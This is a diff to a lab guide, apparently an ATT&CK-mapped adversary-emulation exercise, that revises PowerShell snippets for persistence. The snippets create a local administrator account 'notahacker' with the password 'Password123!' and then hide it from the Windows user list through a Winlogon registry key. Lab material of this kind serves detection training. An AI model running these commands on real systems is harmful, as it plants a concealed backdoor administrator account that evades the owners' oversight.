@@ -66,13 +66,19 @@ w> All labs require you to be running as an administrator.
 ```Powershell
 Write-Host -ForegroundColor Cyan "Initiating Persistence...creating local account"
 Write-Host "Creating user 'notahacker' with admin rights..."
-$cmd = @"
-net user notahacker Password123! /add
-net localgroup administrators notahacker /add
-Start-Sleep -Milliseconds $n
-"@
-powershell.exe -nop -command $cmd 
+
+$n = Get-Random -Minimum 100 -Maximum 1000
+
+$cmd = @(
+    "net user notahacker Password123! /add",
+    "net localgroup administrators notahacker /add",
+    "Start-Sleep -Milliseconds $n"
+) -join "; "
+
+powershell.exe -NoP -Command $cmd
+
 Write-Host -ForegroundColor Green "'notahacker' added to Administrators group successfully."
+```
 
 *Verify user was created.*
 
@@ -95,11 +101,9 @@ notahacker               [youraccount]                 WDAGUtilityAccount
 - [ATT&CK T1564.002-Hide user from userlist](https://attack.mitre.org/techniques/T1564/002/)
 - Copy and paste this command into the terminal:
 ```Powershell
-$cmd = @"
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v "notahacker"
-Start-Sleep -Milliseconds $n
-"@
-powershell.exe -nop -command $cmd
+$n = Get-Random -Minimum 100 -Maximum 1000
+$cmd = "reg add 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' /t REG_DWORD /f /d 0 /v 'notahacker'; Start-Sleep -Milliseconds $n"
+powershell.exe -NoP -Command "$cmd"
 Write-Host -ForegroundColor Green "'notahacker' removed from userlist."
 ```
 
